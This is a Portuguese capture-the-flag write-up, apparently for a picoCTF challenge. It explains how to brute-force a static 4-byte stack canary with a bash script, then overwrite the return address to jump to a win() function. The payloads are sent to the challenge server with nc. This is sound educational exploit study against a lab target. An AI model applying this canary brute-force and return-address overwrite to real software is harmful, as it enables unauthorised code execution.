Neste desafio, temos um *stack canary*, um mecanismo de verificação de integridade da stack.

O stack canary geralmente é um recurso adicionado pelo próprio compilador e consiste em gerar bytes aleatórios e posicioná-los na stack.

Caso ocorra *stack smashing*, ou seja, caso a stack seja sobrescrescrita por algum buffer overflow, esses bytes aleatórios serão alterados, o programa saberá que foi modificado e se fechará.

![](/Screenshots/Pasted%20image%2020220329113131.png)

Porém, neste caso, o canary (os bytes adicionados à stack) não é aleatório e é pequeno (4 bytes, conforme é possível ver no código), o que possibilita um ataque de brute force.

![](/Screenshots/Pasted%20image%2020220329113219.png)

Como o buffer tem 64 bytes, podemos escrever 64 bytes e os próximos serão comparados com o canary. É possível ver que ao mudar o 65º byte (que já está sobrescrevendo o canary), podemos descobrir qual é o seu valor real. Caso o valor esteja errado, ele retorna um erro. Caso contrário, ele retorna "Ok".

![](/Screenshots/Pasted%20image%2020220329115247.png)

Podemos facilmente fazer um script de brute force em bash:

```bash
#!/bin/bash

#bufsize + first byte from canary
bytes=64
aux=$(($bytes - 64))
#define BUFSIZE 64
size=$(($bytes-$aux))

echo "[*] Bruteforcing canary..."
#fill all the buffer
for x in 1 1 1 1; do
	bytes=$(($bytes + $x))
	buf=$(for i in `seq $size`; do echo -n "A";done)
	for((i=32;i<127;i++)); do
		current_canary=$(printf "\\$(printf %03o "$i")")
		payload=${buf}${old_canary}${current_canary}
		result=$(echo -ne "$bytes\n$payload" | ./vuln)
	#	result=$(echo -ne "$bytes\n$payload" | nc saturn.picoctf.net 49980)
		if [ "$(echo -n $result | grep Ok)" ]; then
			old_canary=${old_canary}${current_canary}
			echo $old_canary
			echo ${buf}${old_canary}
			break
		fi
	done
done

echo -e "[*] End bruteforcing. Canary found: $old_canary"
```

Ele nos retorna o canary contido no canary.txt do servidor. Uma vez descoberto, basta usarmos-no após os 64 bytes do buffer. Dessa forma, o canary não será alterado e poderemos escrever após ele mantendo sua integridade.

Depois disso, basta adicionarmos mais 16 bytes de padding e podemos controlar o EIP ao sobrescrever o endereço de retorno.

Como a função `win()` está no endereço `0x08049336`, é para ele que apontaremos o EIP. Isso pode ser feito no próprio script:
```bash
payload=$(echo 100;for i in `seq 64`; do echo -n "A";done; echo -n $old_canary; echo -n "16BytesOfGarbage"; echo -ne "\x36\x93\x04\x08")
echo -ne "$payload" | nc saturn.picoctf.net 54738
```
![](/Screenshots/Pasted%20image%2020220317130925.png)

